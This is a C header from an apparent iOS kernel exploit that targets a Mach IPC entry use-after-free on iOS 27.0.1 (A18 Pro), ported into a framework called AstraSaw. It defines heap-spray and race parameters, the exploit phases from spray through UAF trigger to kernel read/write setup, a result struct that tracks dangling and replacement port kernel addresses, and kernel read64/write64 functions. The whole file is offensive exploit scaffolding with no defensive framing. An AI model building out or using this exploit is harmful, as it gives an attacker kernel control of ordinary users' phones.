// CVE-2026-112474 IPC Entry UAF — ported from Exploit to AstraSaw
// Mach IPC entry use-after-free via race in entry lifetime management.
// Target: iOS 27.0.1 (d94ap / A18 Pro)
// Fix: iOS 27.2.1 — ipc_misc.c adds entry != NULL re-validation
#ifndef IPC_UAF_H
#define IPC_UAF_H

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

#define IPC_UAF_SPRAY_COUNT       5120
#define IPC_UAF_RACE_ITERATIONS   16000
#define IPC_UAF_THREAD_PAIRS      4
#define IPC_UAF_NOTIFY_VARIANTS   5
#define IPC_UAF_REPLACE_PORTS     256
#define IPC_UAF_SLAB_PORTS        71     // ports per 16KB slab (16384/222=73, but 71 usable)
#define IPC_UAF_MAX_ACTIVE_RETRIES  20   // max INACTIVE confused ports before giving up
#define IPC_UAF_MAX_OUTER_RETRIES   5    // re-groom + re-calibrate attempts

typedef enum {
    IPC_UAF_PHASE_SPRAY_SETUP,
    IPC_UAF_PHASE_RACE_CALIBRATE,
    IPC_UAF_PHASE_UAF_TRIGGER,
    IPC_UAF_PHASE_REPLACEMENT,
    IPC_UAF_PHASE_VERIFY,
    IPC_UAF_PHASE_KRW_SETUP,
} ipc_uaf_phase_t;

typedef struct {
    bool     uaf_triggered;
    bool     replacement_confirmed;
    bool     krw_achieved;
    uint32_t race_wins;
    uint32_t race_attempts;
    double   race_win_rate;
    uint32_t winning_variant;
    uint64_t dangling_port_kaddr;
    uint64_t replacement_port_kaddr;
    mach_port_t krw_port;
    bool     port_active;
    uint32_t active_retries;
} ipc_uaf_result_t;

typedef void (*ipc_uaf_log_fn)(const char *line);

void ipc_uaf_set_log(ipc_uaf_log_fn fn);
void ipc_uaf_set_kaslr_slide(uint64_t slide);
void ipc_uaf_run(ipc_uaf_result_t *result);

uint64_t ipc_uaf_kread64(uint64_t addr);
bool ipc_uaf_kwrite64(uint64_t addr, uint64_t val);

#endif
